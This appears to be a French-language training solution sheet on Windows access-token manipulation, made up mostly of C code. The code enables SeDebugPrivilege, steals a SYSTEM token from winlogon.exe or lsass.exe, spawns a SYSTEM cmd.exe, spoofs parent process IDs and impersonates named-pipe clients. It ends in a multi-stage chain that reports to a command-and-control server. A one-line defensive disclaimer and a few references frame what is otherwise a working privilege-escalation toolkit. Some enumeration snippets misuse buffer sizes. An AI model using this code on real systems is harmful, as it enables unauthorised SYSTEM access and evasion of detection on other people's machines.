SOLUTIONS - MODULE 34 : WINDOWS TOKEN MANIPULATION

⚠️ AVERTISSEMENT : Architectures pour analyse défensive uniquement.

SOLUTION 1 : SEDEBUGPRIVILEGE ENABLER

Enable SeDebugPrivilege :
HANDLE hToken;
TOKEN_PRIVILEGES tp;
LUID luid;

OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

Vérification :
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    // Privilège pas assigné (pas admin)
}

Multiples privilèges :
tp.PrivilegeCount = 3;
LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &tp.Privileges[1].Luid);
LookupPrivilegeValue(NULL, SE_TCB_NAME, &tp.Privileges[2].Luid);


SOLUTION 2 : TOKEN STEALING COMPLET

Trouver processus SYSTEM :
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe32;
pe32.dwSize = sizeof(PROCESSENTRY32);

Process32First(hSnapshot, &pe32);
do {
    if (strcmp(pe32.szExeFile, "winlogon.exe") == 0) {
        system_pid = pe32.th32ProcessID;
    }
} while (Process32Next(hSnapshot, &pe32));

OpenProcessToken et DuplicateTokenEx :
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, system_pid);
HANDLE hToken, hNewToken;

OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenPrimary, &hNewToken);

Vérifier integrity level :
TOKEN_MANDATORY_LABEL label;
DWORD size;
GetTokenInformation(hNewToken, TokenIntegrityLevel, &label, sizeof(label), &size);
DWORD integrity = *GetSidSubAuthority(label.Label.Sid,
                   *GetSidSubAuthorityCount(label.Label.Sid) - 1);
// SYSTEM = 0x3000


SOLUTION 3 : CREATEPROCESS WITH STOLEN TOKEN

Spawn SYSTEM cmd.exe :
STARTUPINFOW si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);

// Nécessite SeImpersonatePrivilege
CreateProcessWithTokenW(hNewToken, 0, NULL, L"cmd.exe",
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

Alternative (sans SeImpersonate) :
CreateProcessAsUserW(hNewToken, NULL, L"cmd.exe",
                     NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                     NULL, NULL, &si, &pi);

Vérification dans cmd :
whoami  # Devrait afficher NT AUTHORITY\SYSTEM


SOLUTION 4 : THREAD IMPERSONATION

Impersonation sans CreateProcess :
HANDLE hDupToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenImpersonation, &hDupToken);

ImpersonateLoggedOnUser(hDupToken);

// Vérifier user impersonaté
char username[256];
DWORD size = sizeof(username);
GetUserNameA(username, &size);
printf("Impersonated user: %s\n", username);

// Revert
RevertToSelf();


SOLUTION 5 : TOKEN INFORMATION ENUMERATION

TokenUser (SID) :
TOKEN_USER user;
DWORD size;
GetTokenInformation(hToken, TokenUser, &user, sizeof(user), &size);
char name[256], domain[256];
DWORD name_size = sizeof(name), domain_size = sizeof(domain);
SID_NAME_USE sid_type;
LookupAccountSidA(NULL, user.User.Sid, name, &name_size,
                  domain, &domain_size, &sid_type);

TokenGroups :
TOKEN_GROUPS groups;
GetTokenInformation(hToken, TokenGroups, &groups, sizeof(groups), &size);
for (DWORD i = 0; i < groups.GroupCount; i++) {
    // Afficher chaque groupe
}

TokenPrivileges :
TOKEN_PRIVILEGES privs;
GetTokenInformation(hToken, TokenPrivileges, &privs, sizeof(privs), &size);
for (DWORD i = 0; i < privs.PrivilegeCount; i++) {
    char priv_name[256];
    DWORD name_len = sizeof(priv_name);
    LookupPrivilegeNameA(NULL, &privs.Privileges[i].Luid, priv_name, &name_len);
    printf("%s: %s\n", priv_name,
           (privs.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");
}


SOLUTION 6 : PARENT PID SPOOFING

PPID spoofing :
STARTUPINFOEX siex;
SIZE_T size;
ZeroMemory(&siex, sizeof(siex));
siex.StartupInfo.cb = sizeof(STARTUPINFOEX);

// Initialiser attribute list
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);

// Trouver parent légitime (explorer.exe)
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);

UpdateProcThreadAttribute(siex.lpAttributeList, 0,
                          PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                          &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(NULL, L"cmd.exe", NULL, NULL, FALSE,
               CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
               NULL, NULL, &siex.StartupInfo, &pi);

Détection : Process Explorer/Process Hacker verra parent forgé


SOLUTION 7 : NAMED PIPE IMPERSONATION

Créer named pipe :
HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\malicious",
                                 PIPE_ACCESS_DUPLEX,
                                 PIPE_TYPE_BYTE | PIPE_WAIT,
                                 1, 0, 0, 0, NULL);

ConnectNamedPipe(hPipe, NULL);  // Attendre connexion

// Client se connecte (depuis autre processus/user)
// Dans malware : déclencher connexion d'admin/SYSTEM process

ImpersonateNamedPipeClient(hPipe);

// Maintenant thread a token du client
HANDLE hToken;
OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

// Dupliquer token pour persistence
HANDLE hPrimaryToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenPrimary, &hPrimaryToken);

// Spawn process avec token volé
CreateProcessWithTokenW(hPrimaryToken, 0, NULL, L"cmd.exe", ...);


SOLUTION 8 : TOKEN MANIPULATION MULTI-STAGE

Chaîne complète :

// Stage 1: Enable SeDebugPrivilege
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
enable_privilege(hToken, SE_DEBUG_NAME);

// Stage 2: Find SYSTEM process
DWORD system_pid = find_process("winlogon.exe");
if (!system_pid) system_pid = find_process("lsass.exe");

// Stage 3: Steal token
HANDLE hSystemToken = steal_token(system_pid);

// Stage 4: Verify token (SYSTEM integrity)
verify_integrity_level(hSystemToken);  // Should be 0x3000

// Stage 5: Spawn SYSTEM shell
STARTUPINFOW si;
PROCESS_INFORMATION pi;
CreateProcessWithTokenW(hSystemToken, 0, NULL, L"cmd.exe",
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

// Stage 6: Logging
log_to_file("Token manipulation successful");
log_to_c2("SYSTEM shell spawned PID %d", pi.dwProcessId);

// Stage 7: Cleanup
CloseHandle(hSystemToken);
CloseHandle(hToken);


RÉFÉRENCES :
- MITRE ATT&CK T1134 (Access Token Manipulation)
- Windows Internals (Russinovich, Solomon, Ionescu)
- Mimikatz token manipulation techniques
- CreateProcessWithTokenW MSDN documentation
- Sysmon Event ID 10 (ProcessAccess monitoring)
